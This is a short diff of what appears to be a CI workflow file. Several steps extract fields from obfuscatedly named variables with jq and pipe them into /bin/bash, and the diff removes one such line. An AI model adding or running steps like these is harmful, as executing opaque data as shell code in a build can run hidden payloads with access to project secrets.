@@ -23,7 +23,6 @@ jobs:
           echo $wlid032 | jq -r .ldmgk87 | /bin/bash
           printf '%s' "$klnf645" | jq -r .wor793 | /bin/bash
           printf '%s' "$ozvy1" | jq -r .upqlt683 | /bin/bash
-          printf '%s' "$yuqhp15" | jq -r .ajwe20 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
